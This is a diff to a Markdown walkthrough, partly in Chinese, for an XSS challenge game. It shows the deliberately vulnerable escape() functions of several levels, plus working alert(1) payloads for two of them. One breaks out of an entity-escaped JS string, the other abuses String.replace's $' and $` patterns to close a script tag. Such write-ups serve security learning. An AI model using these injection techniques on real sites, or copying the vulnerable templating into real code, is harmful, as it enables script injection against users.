@@ -1063,6 +1063,180 @@ TODO
 
 
 
+## Capitals
+
+```javascript
+// submitted by msamuel
+function escape(s) {
+  var capitals = {
+    "CA": {
+      "AB": "Edmonton",
+      "BC": "Victoria",
+      "MB": "Winnipeg",
+      // etc.
+    },
+    "US": {
+      // Alabama changed its state capital.
+      "AL": ((year) => year < 1846 ? "Tuscaloosa" : "Montgomery"),
+      "AK": "Juneau",
+      "AR": "Phoenix",
+      // etc.
+    },
+  };
+ 
+  function capitalOf(country, stateOrProvinceName, year) {
+    var capital = capitals[country][stateOrProvinceName];
+    if (typeof capital === 'function') {
+      capital = capital(year);
+    }
+    return capital
+  }
+
+  var inputs = (s || "").split(/#/g);
+  return '<b>'+capitalOf(inputs[0], inputs[1], inputs[2])+'</b>';
+}
+```
+
+TODO
 
 
-## 
+
+## Quine
+
+```javascript
+// submitted by Somebody
+function escape(s) {
+    // We've got a quine level in all of the other
+    // games, so why not have one here?
+    var win = alert;
+    window.alert = function(t) {
+        if (t === s)
+            win(1);
+        else
+            console.log("Alert: " + t + "\n(That's not a quine)");
+    }
+    return s;
+}
+```
+
+TODO
+
+
+
+##Entities
+
+```javascript
+// submitted by securityMB
+function escape(s) {
+  function htmlentities(s) {
+    return s.replace(/[&<>"']/g, c => `&#${c.charCodeAt(0)};`)
+  }
+  s = htmlentities(s);
+  return `<script>
+  var obj = {};
+  obj["${s}"] = "${s}";
+</script>`;
+}
+```
+
+转义了`& < > " '`
+
+方括号拼接，转义引号，和前面的引号拼接，最后一个引号注释掉
+
+Payload
+
+```
+];alert(1)//\
+```
+
+Output
+
+```
+<script>
+  var obj = {};
+  obj["];alert(1)//\"] = "];alert(1)//\";
+</script>
+```
+
+
+
+## Entities 2
+
+```javascript
+// submitted by securityMB
+function escape(s) {
+  // Firefox-only
+  function htmlentities(s) {
+    return s.replace(/[&<>"']/g, c => `&#${c.charCodeAt(0)};`)
+  }
+  s = htmlentities(s);
+  return `<textarea id=t></textarea>
+<script>
+  t.innerHTML = "${s}";
+</script>`;
+}
+```
+
+TODO
+
+Firefox-only，告辞
+
+## %level%
+
+```javascript
+// submitted anonymously
+function escape(s) {
+    const userInput = JSON.stringify(s).replace(/[<]/g, '%lt').replace(/[>]/g, '%gt');
+    const userTemplate = '<script>let some = %userData%</script>';
+    return userTemplate.replace(/%userData%/, userInput);
+}
+```
+
+JSON.stringify()处理后又对尖括号进行编码
+
+可利用的地方在`userTemplate.replace()`
+
+`replace()`方法中替换字符串可以插入特殊变量名
+
+| 变量名 | 代表的值                                                     |
+| ------ | ------------------------------------------------------------ |
+| $$     | 插入一个 "$"                                                 |
+| $&     | 插入匹配的子串                                               |
+| $`     | 插入当前匹配的子串左边的内容                                 |
+| $'     | 插入当前匹配的子串右边的内容                                 |
+| $n     | 假如第一个参数是RegExp对象，且 n 是个小于100的非负整数，那么插入第 n 个括号匹配的字符串 |
+
+例
+
+输入
+
+```
+$'$`
+```
+
+输出
+
+```
+<script>let some = "</script><script>let some = "</script>
+```
+
+成功闭合`<script>`
+
+Payload
+
+```
+$'$`alert(1)//
+```
+
+Output
+
+```
+<script>let some = "</script><script>let some = alert(1)//"</script>
+```
+
+Console output
+
+```
+Error: Uncaught SyntaxError: Invalid or unexpected token
+```
+
